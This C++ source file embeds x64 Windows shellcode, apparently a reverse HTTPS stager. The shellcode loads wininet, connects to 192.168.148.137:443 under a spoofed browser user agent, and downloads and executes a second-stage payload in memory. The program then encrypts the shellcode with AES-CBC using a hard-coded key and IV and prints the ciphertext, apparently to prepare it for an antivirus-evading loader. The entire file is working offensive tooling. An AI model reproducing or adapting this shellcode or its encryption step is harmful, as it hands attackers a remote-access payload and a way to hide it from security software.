#include <windows.h>
#include "AES.h"
#include <iostream>
#include <thread>
using namespace std;

int main() {
	//https x64 shellcode
	unsigned char plain[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xe9\x93\x00\x00\x00\x5a\x48\x89\xc1\x41\xb8\xbb\x01\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x79\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x32\xc0\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\xba\x1f\x00\x00\x00\x6a\x00\x68\x80\x33\x00\x00\x49\x89\xe0\x41\xb9\x04\x00\x00\x00\x41\xba\x75\x46\x9e\x86\xff\xd5\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xb3\xe9\xe4\x01\x00\x00\xe8\x82\xff\xff\xff\x2f\x47\x61\x62\x53\x00\x29\x79\xf6\x19\xc0\x25\xdb\x2d\x99\xc1\x6b\xb8\xfd\xe1\x60\x11\x4a\xc1\x3c\xc3\xac\xa0\x88\x40\x12\x85\x44\xc5\x59\x69\xc0\x81\xb8\x06\xa5\x0e\xc8\xf2\xf5\x91\xf3\x61\x84\x76\x67\x44\x1b\x95\xe7\x5c\xef\x36\x98\xef\x50\x6e\x98\x82\x54\xf7\x98\x45\xf4\xd1\xda\xfd\xc7\x6e\x40\x90\xaf\x69\xd3\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x41\x76\x61\x6e\x74\x20\x42\x72\x6f\x77\x73\x65\x72\x29\x0d\x0a\x48\x6f\x73\x74\x3a\x20\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x34\x38\x2e\x31\x33\x37\x3a\x34\x34\x33\x0d\x0a\x00\xdf\xc7\xfd\xd6\x76\xef\xee\x82\x88\x43\xa7\x8f\x55\x63\x49\x92\x8e\x0e\x6b\x05\x5b\x92\x55\x8d\x15\x20\xc2\xdc\x46\xb3\x3a\xc4\xb4\x2a\x59\x1b\x7d\x21\x1b\xb8\x83\x7a\x98\x95\x47\x61\x80\xe8\x6f\x5e\x93\x94\xbc\x8b\xe7\x1d\x71\xae\x8e\x58\xa5\xf2\x31\xb3\x33\x74\x58\x6a\x6f\xc1\xac\xaf\xa0\x37\x3e\x9c\xfa\x1a\x5e\x92\x75\x16\x86\x62\x1a\x19\xc7\x06\xd6\xe8\x5d\xbf\x1d\xb7\x8e\xb6\x85\x27\x6d\x1b\x02\x45\x04\xe5\x5c\xbc\x2f\xe4\xd7\xdb\xad\x52\xbe\x6c\x1d\xc4\x34\xac\x99\xc6\x51\x48\x74\xd2\x15\xac\x07\xf1\xd3\x6e\x37\xaa\xd1\x7c\xdd\x08\xa3\x3e\xd4\xd1\x66\x81\x20\x09\x0a\x40\x37\x3c\x09\x71\x82\x3e\x16\xc2\x62\x03\x51\x66\xe9\xdb\x72\x52\x83\x02\x41\xfc\xf0\x19\x66\xb1\x82\x62\x02\x8b\xbe\xa9\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x7f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x34\x38\x2e\x31\x33\x37\x00\x00\x00\x22\x90";

	int plain_size = sizeof(plain) / sizeof(plain[0]);
	if (plain_size % 16 != 0) {
		plain_size = plain_size + (16 - (plain_size % 16));
	}

	printf("明文:");
	for (int i = 0; i < plain_size; i++) {
		printf("%x", plain[i]);
	}
	printf("\n");

	unsigned char iv[] = { 0x01, 0x02, 0x03, 0x09, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };
	printf("IV:");
	for (int i = 0; i < 16; i++) {
		printf("%x", iv[i]);
	}
	printf("\n");


	unsigned char key[] = { 0x01, 0x02, 0x03, 0x09, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f }; //key example

	printf("KEY:");
	for (int i = 0; i < 16; i++) {
		printf("%x", key[i]);
	}
	printf("\n");

	AES aes(AESKeyLength::AES_128);


	//加密
	//unsigned char* cipher = aes.EncryptECB(plain, plain_size, key);   //ecb
	unsigned char* cipher = aes.EncryptCBC(plain, plain_size, key, iv);   //cbc
	printf("密文:");
	for (int i = 0; i < plain_size; i++) {
		printf("\\x%02x", cipher[i]);
	}
	printf("\n");


}